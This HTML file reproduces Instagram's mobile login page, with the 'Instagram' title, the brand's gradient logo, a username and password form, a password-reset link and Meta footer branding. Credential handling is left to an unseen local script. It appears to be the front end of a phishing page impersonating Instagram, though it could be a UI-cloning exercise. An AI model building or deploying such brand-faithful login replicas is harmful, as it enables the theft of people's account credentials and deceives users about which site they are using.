<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Instagram</title>
  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 512 512'%3E%3Cdefs%3E%3CradialGradient id='g' cx='30%25' cy='107%25' r='150%25'%3E%3Cstop offset='0%25' stop-color='%23fdf497'/%3E%3Cstop offset='45%25' stop-color='%23fd5949'/%3E%3Cstop offset='60%25' stop-color='%23d6249f'/%3E%3Cstop offset='90%25' stop-color='%23285AEB'/%3E%3C/radialGradient%3E%3C/defs%3E%3Crect x='32' y='32' width='448' height='448' rx='115' fill='none' stroke='url(%23g)' stroke-width='44'/%3E%3Ccircle cx='256' cy='256' r='105' fill='none' stroke='url(%23g)' stroke-width='44'/%3E%3Ccircle cx='385' cy='127' r='27' fill='url(%23g)'/%3E%3C/svg%3E">
 <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="mobile-container">
    <!-- Top Header -->
    <header class="top-bar">
      <button type="button" class="back-btn" aria-label="Back">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <line x1="19" y1="12" x2="5" y2="12"></line>
          <polyline points="12 19 5 12 12 5"></polyline>
        </svg>
      </button>
    </header>

    <!-- Language Selector -->
    <div class="language-selector">
      <span>English (UK)</span>
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <polyline points="6 9 12 15 18 9"></polyline>
      </svg>
    </div>

    <!-- Main Content -->
    <main class="main-content">
      <!-- App Logo -->
      <div class="logo-wrapper">
        <svg class="ig-logo" viewBox="0 0 512 512" width="60" height="60">
          <defs>
            <radialGradient id="ig-grad" cx="30%" cy="107%" r="150%">
              <stop offset="0%" stop-color="#fdf497" />
              <stop offset="5%" stop-color="#fdf497" />
              <stop offset="45%" stop-color="#fd5949" />
              <stop offset="60%" stop-color="#d6249f" />
              <stop offset="90%" stop-color="#285AEB" />
            </radialGradient>
          </defs>
          <rect x="32" y="32" width="448" height="448" rx="115" ry="115" fill="none" stroke="url(#ig-grad)" stroke-width="44" />
          <circle cx="256" cy="256" r="105" fill="none" stroke="url(#ig-grad)" stroke-width="44" />
          <circle cx="385" cy="127" r="27" fill="url(#ig-grad)" />
        </svg>
      </div>

      <!-- Login Form -->
      <form id="loginForm" class="login-form">
        <div class="input-group">
          <input 
            type="text" 
            id="username" 
            name="username" 
            placeholder="Username, email address or mobile number" 
            autocomplete="username"
            required
          >
        </div>

        <div class="input-group">
          <input 
            type="password" 
            id="password" 
            name="password" 
            placeholder="Password" 
            autocomplete="current-password"
            required
          >
        </div>

        <button type="submit" id="loginBtn" class="btn-primary">Log in</button>
      </form>

      <a href="#" class="forgot-link">Forgotten password?</a>
    </main>

    <!-- Footer Section -->
    <footer class="bottom-section">
      <button type="button" class="btn-outline">Create new account</button>
      
      <div class="meta-brand">
        <svg width="20" height="14" viewBox="0 0 28 18" fill="none">
          <path d="M20.9 1.5C18.5 1.5 16.5 3.1 14.8 5.6L14 6.8L13.2 5.6C11.5 3.1 9.5 1.5 7.1 1.5C3.4 1.5 1 4.4 1 8.6C1 13.1 3.7 16.5 7.4 16.5C9.9 16.5 11.8 14.9 13.5 12.3L14 11.5L14.5 12.3C16.2 14.9 18.1 16.5 20.6 16.5C24.3 16.5 27 13.1 27 8.6C27 4.4 24.6 1.5 20.9 1.5ZM7.3 14.3C4.8 14.3 3.2 11.9 3.2 8.6C3.2 5.5 4.7 3.7 7.1 3.7C8.9 3.7 10.4 5 11.9 7.3L12.7 8.6L11.8 10C10.3 12.5 8.9 14.3 7.3 14.3ZM20.7 14.3C19.1 14.3 17.7 12.5 16.2 10L15.3 8.6L16.1 7.3C17.6 5 19.1 3.7 20.9 3.7C23.3 3.7 24.8 5.5 24.8 8.6C24.8 11.9 23.2 14.3 20.7 14.3Z" fill="#cbd2d9"/>
        </svg>
        <span>Meta</span>
      </div>
    </footer>
  </div>

  <script src="script.js"></script>
</body>
</html>
